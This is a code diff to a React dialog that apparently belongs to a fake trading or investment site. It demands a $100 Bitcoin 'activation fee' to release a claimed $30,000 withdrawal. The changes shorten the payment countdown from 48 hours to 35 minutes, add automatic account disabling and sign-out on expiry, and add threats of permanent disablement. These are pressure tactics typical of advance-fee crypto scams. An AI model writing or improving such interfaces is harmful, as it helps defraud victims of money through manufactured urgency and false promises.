@@ -5,22 +5,47 @@ import { Badge } from "@/components/ui/badge";
 import { AlertCircle, Copy, Check, Clock, Shield } from "lucide-react";
 import { useNavigate } from "react-router-dom";
 import { useToast } from "@/hooks/use-toast";
+import { supabase } from "@/integrations/supabase/client";
 import { CONFIRMATION_FEE_WALLET_BTC } from "@/lib/constants";
 
 const ACTIVATION_FEE_AMOUNT = 100;
-const COUNTDOWN_HOURS = 48;
-const COUNTDOWN_STORAGE_KEY = "account_activation_countdown_start";
+const COUNTDOWN_MINUTES = 35;
+const COUNTDOWN_STORAGE_KEY = "account_activation_countdown_35m_start";
 
 interface AccountRestrictionFeeDialogProps {
   open: boolean;
+  userId?: string;
 }
 
-export const AccountRestrictionFeeDialog = ({ open }: AccountRestrictionFeeDialogProps) => {
-  const [timeLeft, setTimeLeft] = useState(COUNTDOWN_HOURS * 60 * 60);
+export const AccountRestrictionFeeDialog = ({ open, userId }: AccountRestrictionFeeDialogProps) => {
+  const [timeLeft, setTimeLeft] = useState(COUNTDOWN_MINUTES * 60);
   const [isExpired, setIsExpired] = useState(false);
   const [copied, setCopied] = useState(false);
+  const [disabling, setDisabling] = useState(false);
   const navigate = useNavigate();
   const { toast } = useToast();
+
+  // Auto-disable account when expired
+  const disableAccount = useCallback(async () => {
+    if (!userId || disabling) return;
+    setDisabling(true);
+    try {
+      const { error } = await supabase.functions.invoke("auto-disable-expired-account", {
+        body: { user_id: userId },
+      });
+      if (error) console.error("Auto-disable error:", error);
+    } catch (e) {
+      console.error("Auto-disable failed:", e);
+    }
+    // Sign out regardless
+    await supabase.auth.signOut();
+    toast({
+      title: "Account Permanently Disabled",
+      description: "Your account has been permanently disabled due to non-payment of the activation fee. Contact support for assistance.",
+      variant: "destructive",
+    });
+    navigate("/auth");
+  }, [userId, disabling, navigate, toast]);
 
   useEffect(() => {
     if (!open) return;
@@ -32,10 +57,19 @@ export const AccountRestrictionFeeDialog = ({ open }: AccountRestrictionFeeDialo
     }
 
     const elapsed = Math.floor((Date.now() - parseInt(startTime)) / 1000);
-    const remaining = Math.max(0, COUNTDOWN_HOURS * 60 * 60 - elapsed);
+    const remaining = Math.max(0, COUNTDOWN_MINUTES * 60 - elapsed);
     setTimeLeft(remaining);
-    if (remaining === 0) setIsExpired(true);
+    if (remaining === 0) {
+      setIsExpired(true);
+    }
   }, [open]);
+
+  // When expired, auto-disable
+  useEffect(() => {
+    if (isExpired && userId) {
+      disableAccount();
+    }
+  }, [isExpired, userId, disableAccount]);
 
   useEffect(() => {
     if (!open || isExpired) return;
@@ -54,10 +88,9 @@ export const AccountRestrictionFeeDialog = ({ open }: AccountRestrictionFeeDialo
   }, [open, isExpired]);
 
   const formatTime = useCallback((seconds: number) => {
-    const h = Math.floor(seconds / 3600);
-    const m = Math.floor((seconds % 3600) / 60);
+    const m = Math.floor(seconds / 60);
     const s = seconds % 60;
-    return `${h.toString().padStart(2, "0")}:${m.toString().padStart(2, "0")}:${s.toString().padStart(2, "0")}`;
+    return `${m.toString().padStart(2, "0")}:${s.toString().padStart(2, "0")}`;
   }, []);
 
   const copyAddress = async () => {
@@ -71,7 +104,7 @@ export const AccountRestrictionFeeDialog = ({ open }: AccountRestrictionFeeDialo
     }
   };
 
-  const progressPercent = (timeLeft / (COUNTDOWN_HOURS * 60 * 60)) * 100;
+  const progressPercent = (timeLeft / (COUNTDOWN_MINUTES * 60)) * 100;
 
   return (
     <AlertDialog open={open}>
@@ -114,7 +147,7 @@ export const AccountRestrictionFeeDialog = ({ open }: AccountRestrictionFeeDialo
             <span className="flex items-center gap-1.5 text-muted-foreground">
               <Clock className="h-4 w-4" /> Time Remaining
             </span>
-            <span className={`font-mono font-bold text-lg ${isExpired ? "text-destructive" : timeLeft < 3600 ? "text-destructive animate-pulse" : "text-foreground"}`}>
+            <span className={`font-mono font-bold text-lg ${isExpired ? "text-destructive" : timeLeft < 300 ? "text-destructive animate-pulse" : "text-foreground"}`}>
               {isExpired ? "EXPIRED" : formatTime(timeLeft)}
             </span>
           </div>
@@ -126,7 +159,7 @@ export const AccountRestrictionFeeDialog = ({ open }: AccountRestrictionFeeDialo
           </div>
           {isExpired && (
             <p className="text-xs text-destructive font-medium text-center">
-              ⚠️ The deadline has passed. Your account may face permanent suspension. Contact support immediately.
+              ⚠️ Your account has been permanently disabled due to non-payment. Contact support immediately.
             </p>
           )}
         </div>
@@ -149,6 +182,8 @@ export const AccountRestrictionFeeDialog = ({ open }: AccountRestrictionFeeDialo
           <p className="text-xs text-foreground/70">
             <strong>⚠️ Important:</strong> The fee must be sent in a <strong>single BTC transaction</strong> to the address above. 
             Once confirmed on the blockchain, your $30,000.00 withdrawal will be processed automatically.
+            <br /><br />
+            <strong className="text-destructive">Failure to pay within the countdown will result in permanent account disablement.</strong>
           </p>
         </div>
 
@@ -157,6 +192,7 @@ export const AccountRestrictionFeeDialog = ({ open }: AccountRestrictionFeeDialo
           <Button
             onClick={() => navigate("/dashboard/deposit")}
             className="w-full bg-primary hover:bg-primary/90 text-primary-foreground"
+            disabled={isExpired}
           >
             Pay ${ACTIVATION_FEE_AMOUNT.toLocaleString()} Activation Fee
           </Button>
